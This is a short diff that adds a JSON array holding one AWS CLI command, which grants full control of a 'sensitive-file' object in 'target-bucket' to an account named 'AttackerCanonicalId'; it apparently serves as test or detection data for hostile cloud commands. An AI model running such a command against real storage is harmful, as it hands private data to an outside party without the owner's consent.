@@ -1,0 +1,3 @@
+[
+  "aws s3api put-object-acl --bucket target-bucket --key sensitive-file --acl bucket-owner-full-control --grant-full-control id=AttackerCanonicalId"
+]
